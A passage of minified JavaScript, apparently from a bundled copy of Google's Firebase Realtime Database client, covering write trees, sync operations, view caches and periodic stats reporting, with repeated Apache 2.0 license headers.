"+d.status),i(d.status);i=null}},d.open("GET",c,!0),d.send()})}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ZV{constructor(){this.rootNode_=He.EMPTY_NODE}getNode(e){return this.rootNode_.getChild(e)}updateSnapshot(e,n){this.rootNode_=this.rootNode_.updateChild(e,n)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Lm(){return{value:null,children:new Map}}function SN(t,e,n){if(lt(e))t.value=n,t.children.clear();else if(t.value!==null)t.value=t.value.updateChild(e,n);else{const i=et(e);t.children.has(i)||t.children.set(i,Lm());const s=t.children.get(i);e=Bt(e),SN(s,e,n)}}function sv(t,e,n){t.value!==null?n(e,t.value):JV(t,(i,s)=>{const o=new Ot(e.toString()+"/"+i);sv(s,o,n)})}function JV(t,e){t.children.forEach((n,i)=>{e(i,n)})}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class eU{constructor(e){this.collection_=e,this.last_=null}get(){const e=this.collection_.get(),n=Object.assign({},e);return this.last_&&zn(this.last_,(i,s)=>{n[i]=n[i]-s}),this.last_=e,n}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const DE=10*1e3,tU=30*1e3,nU=5*60*1e3;class iU{constructor(e,n){this.server_=n,this.statsToReport_={},this.statsListener_=new eU(e);const i=DE+(tU-DE)*Math.random();dd(this.reportStats_.bind(this),Math.floor(i))}reportStats_(){const e=this.statsListener_.get(),n={};let i=!1;zn(e,(s,o)=>{o>0&&ns(this.statsToReport_,s)&&(n[s]=o,i=!0)}),i&&this.server_.reportStats(n),dd(this.reportStats_.bind(this),Math.floor(Math.random()*2*nU))}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */var vr;(function(t){t[t.OVERWRITE=0]="OVERWRITE",t[t.MERGE=1]="MERGE",t[t.ACK_USER_WRITE=2]="ACK_USER_WRITE",t[t.LISTEN_COMPLETE=3]="LISTEN_COMPLETE"})(vr||(vr={}));function aw(){return{fromUser:!0,fromServer:!1,queryId:null,tagged:!1}}function ow(){return{fromUser:!1,fromServer:!0,queryId:null,tagged:!1}}function lw(t){return{fromUser:!1,fromServer:!0,queryId:t,tagged:!0}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Vm{constructor(e,n,i){this.path=e,this.affectedTree=n,this.revert=i,this.type=vr.ACK_USER_WRITE,this.source=aw()}operationForChild(e){if(lt(this.path)){if(this.affectedTree.value!=null)return ye(this.affectedTree.children.isEmpty(),"affectedTree should not have overlapping affected paths."),this;{const n=this.affectedTree.subtree(new Ot(e));return new Vm(Et(),n,this.revert)}}else return ye(et(this.path)===e,"operationForChild called for unrelated child."),new Vm(Bt(this.path),this.affectedTree,this.revert)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Dd{constructor(e,n){this.source=e,this.path=n,this.type=vr.LISTEN_COMPLETE}operationForChild(e){return lt(this.path)?new Dd(this.source,Et()):new Dd(this.source,Bt(this.path))}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Qo{constructor(e,n,i){this.source=e,this.path=n,this.snap=i,this.type=vr.OVERWRITE}operationForChild(e){return lt(this.path)?new Qo(this.source,Et(),this.snap.getImmediateChild(e)):new Qo(this.source,Bt(this.path),this.snap)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Tc{constructor(e,n,i){this.source=e,this.path=n,this.children=i,this.type=vr.MERGE}operationForChild(e){if(lt(this.path)){const n=this.children.subtree(new Ot(e));return n.isEmpty()?null:n.value?new Qo(this.source,Et(),n.value):new Tc(this.source,Et(),n)}else return ye(et(this.path)===e,"Can't get a merge for a child not on the path of the operation"),new Tc(this.source,Bt(this.path),this.children)}toString(){return"Operation("+this.path+": "+this.source.toString()+" merge: "+this.children.toString()+")"}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Ko{constructor(e,n,i){this.node_=e,this.fullyInitialized_=n,this.filtered_=i}isFullyInitialized(){return this.fullyInitialized_}isFiltered(){return this.filtered_}isCompleteForPath(e){if(lt(e))return this.isFullyInitialized()&&!this.filtered_;const n=et(e);return this.isCompleteForChild(n)}isCompleteForChild(e){return this.isFullyInitialized()&&!this.filtered_||this.node_.hasChild(e)}getNode(){return this.node_}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class rU{constructor(e){this.query_=e,this.index_=this.query_._queryParams.getIndex()}}function sU(t,e,n,i){const s=[],o=[];return e.forEach(c=>{c.type==="child_changed"&&t.index_.indexedValueChanged(c.oldSnap,c.snapshotNode)&&o.push(WV(c.childName,c.snapshotNode))}),Xu(t,s,"child_removed",e,i,n),Xu(t,s,"child_added",e,i,n),Xu(t,s,"child_moved",o,i,n),Xu(t,s,"child_changed",e,i,n),Xu(t,s,"value",e,i,n),s}function Xu(t,e,n,i,s,o){const c=i.filter(d=>d.type===n);c.sort((d,f)=>oU(t,d,f)),c.forEach(d=>{const f=aU(t,d,o);s.forEach(p=>{p.respondsTo(d.type)&&e.push(p.createEvent(f,t.query_))})})}function aU(t,e,n){return e.type==="value"||e.type==="child_removed"||(e.prevName=n.getPredecessorChildName(e.childName,e.snapshotNode,t.index_)),e}function oU(t,e,n){if(e.childName==null||n.childName==null)throw Oc("Should only compare child_ events.");const i=new nt(e.childName,e.snapshotNode),s=new nt(n.childName,n.snapshotNode);return t.index_.compare(i,s)}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Rp(t,e){return{eventCache:t,serverCache:e}}function hd(t,e,n,i){return Rp(new Ko(e,n,i),t.serverCache)}function NN(t,e,n,i){return Rp(t.eventCache,new Ko(e,n,i))}function av(t){return t.eventCache.isFullyInitialized()?t.eventCache.getNode():null}function Wo(t){return t.serverCache.isFullyInitialized()?t.serverCache.getNode():null}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let g0;const lU=()=>(g0||(g0=new vi(Y7)),g0);class Ut{static fromObject(e){let n=new Ut(null);return zn(e,(i,s)=>{n=n.set(new Ot(i),s)}),n}constructor(e,n=lU()){this.value=e,this.children=n}isEmpty(){return this.value===null&&this.children.isEmpty()}findRootMostMatchingPathAndValue(e,n){if(this.value!=null&&n(this.value))return{path:Et(),value:this.value};if(lt(e))return null;{const i=et(e),s=this.children.get(i);if(s!==null){const o=s.findRootMostMatchingPathAndValue(Bt(e),n);return o!=null?{path:Kt(new Ot(i),o.path),value:o.value}:null}else return null}}findRootMostValueAndPath(e){return this.findRootMostMatchingPathAndValue(e,()=>!0)}subtree(e){if(lt(e))return this;{const n=et(e),i=this.children.get(n);return i!==null?i.subtree(Bt(e)):new Ut(null)}}set(e,n){if(lt(e))return new Ut(n,this.children);{const i=et(e),o=(this.children.get(i)||new Ut(null)).set(Bt(e),n),c=this.children.insert(i,o);return new Ut(this.value,c)}}remove(e){if(lt(e))return this.children.isEmpty()?new Ut(null):new Ut(null,this.children);{const n=et(e),i=this.children.get(n);if(i){const s=i.remove(Bt(e));let o;return s.isEmpty()?o=this.children.remove(n):o=this.children.insert(n,s),this.value===null&&o.isEmpty()?new Ut(null):new Ut(this.value,o)}else return this}}get(e){if(lt(e))return this.value;{const n=et(e),i=this.children.get(n);return i?i.get(Bt(e)):null}}setTree(e,n){if(lt(e))return n;{const i=et(e),o=(this.children.get(i)||new Ut(null)).setTree(Bt(e),n);let c;return o.isEmpty()?c=this.children.remove(i):c=this.children.insert(i,o),new Ut(this.value,c)}}fold(e){return this.fold_(Et(),e)}fold_(e,n){const i={};return this.children.inorderTraversal((s,o)=>{i[s]=o.fold_(Kt(e,s),n)}),n(e,this.value,i)}findOnPath(e,n){return this.findOnPath_(e,Et(),n)}findOnPath_(e,n,i){const s=this.value?i(n,this.value):!1;if(s)return s;if(lt(e))return null;{const o=et(e),c=this.children.get(o);return c?c.findOnPath_(Bt(e),Kt(n,o),i):null}}foreachOnPath(e,n){return this.foreachOnPath_(e,Et(),n)}foreachOnPath_(e,n,i){if(lt(e))return this;{this.value&&i(n,this.value);const s=et(e),o=this.children.get(s);return o?o.foreachOnPath_(Bt(e),Kt(n,s),i):new Ut(null)}}foreach(e){this.foreach_(Et(),e)}foreach_(e,n){this.children.inorderTraversal((i,s)=>{s.foreach_(Kt(e,i),n)}),this.value&&n(e,this.value)}foreachChild(e){this.children.inorderTraversal((n,i)=>{i.value&&e(n,i.value)})}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class wr{constructor(e){this.writeTree_=e}static empty(){return new wr(new Ut(null))}}function fd(t,e,n){if(lt(e))return new wr(new Ut(n));{const i=t.writeTree_.findRootMostValueAndPath(e);if(i!=null){const s=i.path;let o=i.value;const c=yi(s,e);return o=o.updateChild(c,n),new wr(t.writeTree_.set(s,o))}else{const s=new Ut(n),o=t.writeTree_.setTree(e,s);return new wr(o)}}}function ov(t,e,n){let i=t;return zn(n,(s,o)=>{i=fd(i,Kt(e,s),o)}),i}function ME(t,e){if(lt(e))return wr.empty();{const n=t.writeTree_.setTree(e,new Ut(null));return new wr(n)}}function lv(t,e){return sl(t,e)!=null}function sl(t,e){const n=t.writeTree_.findRootMostValueAndPath(e);return n!=null?t.writeTree_.get(n.path).getChild(yi(n.path,e)):null}function OE(t){const e=[],n=t.writeTree_.value;return n!=null?n.isLeafNode()||n.forEachChild(Wt,(i,s)=>{e.push(new nt(i,s))}):t.writeTree_.children.inorderTraversal((i,s)=>{s.value!=null&&e.push(new nt(i,s.value))}),e}function Va(t,e){if(lt(e))return t;{const n=sl(t,e);return n!=null?new wr(new Ut(n)):new wr(t.writeTree_.subtree(e))}}function cv(t){return t.writeTree_.isEmpty()}function Cc(t,e){return RN(Et(),t.writeTree_,e)}function RN(t,e,n){if(e.value!=null)return n.updateChild(t,e.value);{let i=null;return e.children.inorderTraversal((s,o)=>{s===".priority"?(ye(o.value!==null,"Priority writes must always be leaf nodes"),i=o.value):n=RN(Kt(t,s),o,n)}),!n.getChild(t).isEmpty()&&i!==null&&(n=n.updateChild(Kt(t,".priority"),i)),n}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function cw(t,e){return MN(e,t)}function cU(t,e,n,i,s){ye(i>t.lastWriteId,"Stacking an older write on top of newer ones"),s===void 0&&(s=!0),t.allWrites.push({path:e,snap:n,writeId:i,visible:s}),s&&(t.visibleWrites=fd(t.visibleWrites,e,n)),t.lastWriteId=i}function uU(t,e,n,i){ye(i>t.lastWriteId,"Stacking an older merge on top of newer ones"),t.allWrites.push({path:e,children:n,writeId:i,visible:!0}),t.visibleWrites=ov(t.visibleWrites,e,n),t.lastWriteId=i}function dU(t,e){for(let n=0;n<t.allWrites.length;n++){const i=t.allWrites[n];if(i.writeId===e)return i}return null}function hU(t,e){const n=t.allWrites.findIndex(d=>d.writeId===e);ye(n>=0,"removeWrite called with nonexistent writeId.");const i=t.allWrites[n];t.allWrites.splice(n,1);let s=i.visible,o=!1,c=t.allWrites.length-1;for(;s&&c>=0;){const d=t.allWrites[c];d.visible&&(c>=n&&fU(d,i.path)?s=!1:sr(i.path,d.path)&&(o=!0)),c--}if(s){if(o)return mU(t),!0;if(i.snap)t.visibleWrites=ME(t.visibleWrites,i.path);else{const d=i.children;zn(d,f=>{t.visibleWrites=ME(t.visibleWrites,Kt(i.path,f))})}return!0}else return!1}function fU(t,e){if(t.snap)return sr(t.path,e);for(const n in t.children)if(t.children.hasOwnProperty(n)&&sr(Kt(t.path,n),e))return!0;return!1}function mU(t){t.visibleWrites=IN(t.allWrites,pU,Et()),t.allWrites.length>0?t.lastWriteId=t.allWrites[t.allWrites.length-1].writeId:t.lastWriteId=-1}function pU(t){return t.visible}function IN(t,e,n){let i=wr.empty();for(let s=0;s<t.length;++s){const o=t[s];if(e(o)){const c=o.path;let d;if(o.snap)sr(n,c)?(d=yi(n,c),i=fd(i,d,o.snap)):sr(c,n)&&(d=yi(c,n),i=fd(i,Et(),o.snap.getChild(d)));else if(o.children){if(sr(n,c))d=yi(n,c),i=ov(i,d,o.children);else if(sr(c,n))if(d=yi(c,n),lt(d))i=ov(i,Et(),o.children);else{const f=fc(o.children,et(d));if(f){const p=f.getChild(Bt(d));i=fd(i,Et(),p)}}}else throw Oc("WriteRecord should have .snap or .children")}}return i}function kN(t,e,n,i,s){if(!i&&!s){const o=sl(t.visibleWrites,e);if(o!=null)return o;{const c=Va(t.visibleWrites,e);if(cv(c))return n;if(n==null&&!lv(c,Et()))return null;{const d=n||He.EMPTY_NODE;return Cc(c,d)}}}else{const o=Va(t.visibleWrites,e);if(!s&&cv(o))return n;if(!s&&n==null&&!lv(o,Et()))return null;{const c=function(p){return(p.visible||s)&&(!i||!~i.indexOf(p.writeId))&&(sr(p.path,e)||sr(e,p.path))},d=IN(t.allWrites,c,e),f=n||He.EMPTY_NODE;return Cc(d,f)}}}function gU(t,e,n){let i=He.EMPTY_NODE;const s=sl(t.visibleWrites,e);if(s)return s.isLeafNode()||s.forEachChild(Wt,(o,c)=>{i=i.updateImmediateChild(o,c)}),i;if(n){const o=Va(t.visibleWrites,e);return n.forEachChild(Wt,(c,d)=>{const f=Cc(Va(o,new Ot(c)),d);i=i.updateImmediateChild(c,f)}),OE(o).forEach(c=>{i=i.updateImmediateChild(c.name,c.node)}),i}else{const o=Va(t.visibleWrites,e);return OE(o).forEach(c=>{i=i.updateImmediateChild(c.name,c.node)}),i}}function yU(t,e,n,i,s){ye(i||s,"Either existingEventSnap or existingServerSnap must exist");const o=Kt(e,n);if(lv(t.visibleWrites,o))return null;{const c=Va(t.visibleWrites,o);return cv(c)?s.getChild(n):Cc(c,s.getChild(n))}}function vU(t,e,n,i){const s=Kt(e,n),o=sl(t.visibleWrites,s);if(o!=null)return o;if(i.isCompleteForChild(n)){const c=Va(t.visibleWrites,s);return Cc(c,i.getNode().getImmediateChild(n))}else return null}function _U(t,e){return sl(t.visibleWrites,e)}function wU(t,e,n,i,s,o,c){let d;const f=Va(t.visibleWrites,e),p=sl(f,Et());if(p!=null)d=p;else if(n!=null)d=Cc(f,n);else return[];if(d=d.withIndex(c),!d.isEmpty()&&!d.isLeafNode()){const v=[],b=c.getCompare(),w=o?d.getReverseIteratorFrom(i,c):d.getIteratorFrom(i,c);let E=w.getNext();for(;E&&v.length<s;)b(E,i)!==0&&v.push(E),E=w.getNext();return v}else return[]}function bU(){return{visibleWrites:wr.empty(),allWrites:[],lastWriteId:-1}}function Um(t,e,n,i){return kN(t.writeTree,t.treePath,e,n,i)}function uw(t,e){return gU(t.writeTree,t.treePath,e)}function PE(t,e,n,i){return yU(t.writeTree,t.treePath,e,n,i)}function Bm(t,e){return _U(t.writeTree,Kt(t.treePath,e))}function xU(t,e,n,i,s,o){return wU(t.writeTree,t.treePath,e,n,i,s,o)}function dw(t,e,n){return vU(t.writeTree,t.treePath,e,n)}function DN(t,e){return MN(Kt(t.treePath,e),t.writeTree)}function MN(t,e){return{treePath:t,writeTree:e}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class AU{constructor(){this.changeMap=new Map}trackChildChange(e){const n=e.type,i=e.childName;ye(n==="child_added"||n==="child_changed"||n==="child_removed","Only child changes supported for tracking"),ye(i!==".priority","Only non-priority child changes can be tracked.");const s=this.changeMap.get(i);if(s){const o=s.type;if(n==="child_added"&&o==="child_removed")this.changeMap.set(i,Id(i,e.snapshotNode,s.snapshotNode));else if(n==="child_removed"&&o==="child_added")this.changeMap.delete(i);else if(n==="child_removed"&&o==="child_changed")this.changeMap.set(i,Rd(i,s.oldSnap));else if(n==="child_changed"&&o==="child_added")this.changeMap.set(i,Ec(i,e.snapshotNode));else if(n==="child_changed"&&o==="child_changed")this.changeMap.set(i,Id(i,e.snapshotNode,s.oldSnap));else throw Oc("Illegal combination of changes: "+e+" occurred after "+s)}else this.changeMap.set(i,e)}getChanges(){return Array.from(this.changeMap.values())}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class EU{getCompleteChild(e){return null}getChildAfterChild(e,n,i){return null}}const ON=new EU;class hw{constructor(e,n,i=null){this.writes_=e,this.viewCache_=n,this.optCompleteServerCache_=i}getCompleteChild(e){const n=this.viewCache_.eventCache;if(n.isCompleteForChild(e))return n.getNode().getImmediateChild(e);{const i=this.optCompleteServerCache_!=null?new Ko(this.optCompleteServerCache_,!0,!1):this.viewCache_.serverCache;return dw(this.writes_,e,i)}}getChildAfterChild(e,n,i){const s=this.optCompleteServerCache_!=null?this.optCompleteServerCache_:Wo(this.viewCache_),o=xU(this.writes_,s,n,1,i,e);return o.length===0?null:o[0]}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function TU(t){return{filter:t}}function CU(t,e){ye(e.eventCache.getNode().isIndexed(t.filter.getIndex()),"Event snap not indexed"),ye(e.serverCache.getNode().isIndexed(t.filter.getIndex()),"Server snap not indexed")}function SU(t,e,n,i,s){const o=new AU;let c,d;if(n.type===vr.OVERWRITE){const p=n;p.source.fromUser?c=uv(t,e,p.path,p.snap,i,s,o):(ye(p.source.fromServer,"Unknown source."),d=p.source.tagged||e.serverCache.isFiltered()&&!lt(p.path),c=zm(t,e,p.path,p.snap,i,s,d,o))}else if(n.type===vr.MERGE){const p=n;p.source.fromUser?c=RU(t,e,p.path,p.children,i,s,o):(ye(p.source.fromServer,"Unknown source."),d=p.source.tagged||e.serverCache.isFiltered(),c=dv(t,e,p.path,p.children,i,s,d,o))}else if(n.type===vr.ACK_USER_WRITE){const p=n;p.revert?c=DU(t,e,p.path,i,s,o):c=IU(t,e,p.path,p.affectedTree,i,s,o)}else if(n.type===vr.LISTEN_COMPLETE)c=kU(t,e,n.path,i,o);else throw Oc("Unknown operation type: "+n.type);const f=o.getChanges();return NU(e,c,f),{viewCache:c,changes:f}}function NU(t,e,n){const i=e.eventCache;if(i.isFullyInitialized()){const s=i.getNode().isLeafNode()||i.getNode().isEmpty(),o=av(t);(n.length>0||!t.eventCache.isFullyInitialized()||s&&!i.getNode().equals(o)||!i.getNode().getPriority().equals(o.getPriority()))&&n.push(CN(av(e)))}}function PN(t,e,n,i,s,o){const c=e.eventCache;if(Bm(i,n)!=null)return e;{let d,f;if(lt(n))if(ye(e.serverCache.isFullyInitialized(),"If change path is empty, we must have complete server data"),e.serverCache.isFiltered()){const p=Wo(e),v=p instanceof He?p:He.EMPTY_NODE,b=uw(i,v);d=t.filter.updateFullNode(e.eventCache.getNode(),b,o)}else{const p=Um(i,Wo(e));d=t.filter.updateFullNode(e.eventCache.getNode(),p,o)}else{const p=et(n);if(p===".priority"){ye(Ka(n)===1,"Can't have a priority with additional path components");const v=c.getNode();f=e.serverCache.getNode();const b=PE(i,n,v,f);b!=null?d=t.filter.updatePriority(v,b):d=c.getNode()}else{const v=Bt(n);let b;if(c.isCompleteForChild(p)){f=e.serverCache.getNode();const w=PE(i,n,c.getNode(),f);w!=null?b=c.getNode().getImmediateChild(p).updateChild(v,w):b=c.getNode().getImmediateChild(p)}else b=dw(i,p,e.serverCache);b!=null?d=t.filter.updateChild(c.getNode(),p,b,v,s,o):d=c.getNode()}}return hd(e,d,c.isFullyInitialized()||lt(n),t.filter.filtersNodes())}}function zm(t,e,n,i,s,o,c,d){const f=e.serverCache;let p;const v=c?t.filter:t.filter.getIndexedFilter();if(lt(n))p=v.updateFullNode(f.getNode(),i,null);else if(v.filtersNodes()&&!f.isFiltered()){const E=f.getNode().updateChild(n,i);p=v.updateFullNode(f.getNode(),E,null)}else{const E=et(n);if(!f.isCompleteForPath(n)&&Ka(n)>1)return e;const C=Bt(n),V=f.getNode().getImmediateChild(E).updateChild(C,i);E===".priority"?p=v.updatePriority(f.getNode(),V):p=v.updateChild(f.getNode(),E,V,C,ON,null)}const b=NN(e,p,f.isFullyInitialized()||lt(n),v.filtersNodes()),w=new hw(s,b,o);return PN(t,b,n,s,w,d)}function uv(t,e,n,i,s,o,c){const d=e.eventCache;let f,p;const v=new hw(s,e,o);if(lt(n))p=t.filter.updateFullNode(e.eventCache.getNode(),i,c),f=hd(e,p,!0,t.filter.filtersNodes());else{const b=et(n);if(b===".priority")p=t.filter.updatePriority(e.eventCache.getNode(),i),f=hd(e,p,d.isFullyInitialized(),d.isFiltered());else{const w=Bt(n),E=d.getNode().getImmediateChild(b);let C;if(lt(w))C=i;else{const M=v.getCompleteChild(b);M!=null?ew(w)===".priority"&&M.getChild(_N(w)).isEmpty()?C=M:C=M.updateChild(w,i):C=He.EMPTY_NODE}if(E.equals(C))f=e;else{const M=t.filter.updateChild(d.getNode(),b,C,w,v,c);f=hd(e,M,d.isFullyInitialized(),t.filter.filtersNodes())}}}return f}function jE(t,e){return t.eventCache.isCompleteForChild(e)}function RU(t,e,n,i,s,o,c){let d=e;return i.foreach((f,p)=>{const v=Kt(n,f);jE(e,et(v))&&(d=uv(t,d,v,p,s,o,c))}),i.foreach((f,p)=>{const v=Kt(n,f);jE(e,et(v))||(d=uv(t,d,v,p,s,o,c))}),d}function LE(t,e,n){return n.foreach((i,s)=>{e=e.updateChild(i,s)}),e}function dv(t,e,n,i,s,o,c,d){if(e.serverCache.getNode().isEmpty()&&!e.serverCache.isFullyInitialized())return e;let f=e,p;lt(n)?p=i:p=new Ut(null).setTree(n,i);const v=e.serverCache.getNode();return p.children.inorderTraversal((b,w)=>{if(v.hasChild(b)){const E=e.serverCache.getNode().getImmediateChild(b),C=LE(t,E,w);f=zm(t,f,new Ot(b),C,s,o,c,d)}}),p.children.inorderTraversal((b,w)=>{const E=!e.serverCache.isCompleteForChild(b)&&w.value===null;if(!v.hasChild(b)&&!E){const C=e.serverCache.getNode().getImmediateChild(b),M=LE(t,C,w);f=zm(t,f,new Ot(b),M,s,o,c,d)}}),f}function IU(t,e,n,i,s,o,c){if(Bm(s,n)!=null)return e;const d=e.serverCache.isFiltered(),f=e.serverCache;if(i.value!=null){if(lt(n)&&f.isFullyInitialized()||f.isCompleteForPath(n))return zm(t,e,n,f.getNode().getChild(n),s,o,d,c);if(lt(n)){let p=new Ut(null);return f.getNode().forEachChild(oc,(v,b)=>{p=p.set(new Ot(v),b)}),dv(t,e,n,p,s,o,d,c)}else return e}else{let p=new Ut(null);return i.foreach((v,b)=>{const w=Kt(n,v);f.isCompleteForPath(w)&&(p=p.set(v,f.getNode().getChild(w)))}),dv(t,e,n,p,s,o,d,c)}}function kU(t,e,n,i,s){const o=e.serverCache,c=NN(e,o.getNode(),o.isFullyInitialized()||lt(n),o.isFiltered());return PN(t,c,n,i,ON,s)}function DU(t,e,n,i,s,o){let c;if(Bm(i,n)!=null)return e;{const d=new 